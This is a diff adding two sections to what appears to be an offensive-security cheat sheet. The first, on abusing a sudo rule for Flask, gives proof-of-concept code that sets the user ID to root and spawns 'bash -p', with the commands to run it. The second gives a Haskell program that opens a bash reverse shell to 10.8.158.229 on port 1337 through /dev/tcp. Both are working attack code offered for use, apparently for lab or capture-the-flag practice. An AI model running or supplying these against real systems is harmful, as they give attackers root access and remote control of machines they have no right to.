@@ -390,12 +390,57 @@ References:
 
  - [Roquenight](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
    
- ---------------------------------
-    
-    
+---------------------------------
 
+### Abusing suid flask
 
+- Sudoers rule
 
-
-
+![image](https://github.com/user-attachments/assets/5402e95f-60ca-4b2d-a2b3-a5d200399287)
+ 
+- Poc code
   
+            import os
+            from flask import Flask,render_template_string
+            
+            app = Flask(__name__)
+            os.setuid(0)
+            os.setgid(0)
+            os.system("bash -p")
+            
+            @app.route("/")
+            def index():
+                return render_template_string("Life tuff ooo!!!!")
+            
+            if __name__ == "__main__":
+               app.run(port=8080,debug=True)
+
+- Set the environmetal variables
+
+      export FLASK_APP=app.py
+      export FLASK_ENV=development
+
+- Run
+       sudo -u root /usr/bin/flask run
+
+- Root
+
+![image](https://github.com/user-attachments/assets/34e3c7a7-03b6-4b1b-b857-bdb93143c5e9)
+
+---------------------------
+
+### Executing Shell Commands with Haskell code
+
+- Save as run.hs
+
+      import System.Process
+      
+      main = callCommand "bash -c 'bash -i 5<> /dev/tcp/10.8.158.229/1337 0<&5 1>&5 2>&5'"
+
+---------------------------
+
+### REFERENCES:
+
+- [Stack Overflow](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)
+
+---------------------------
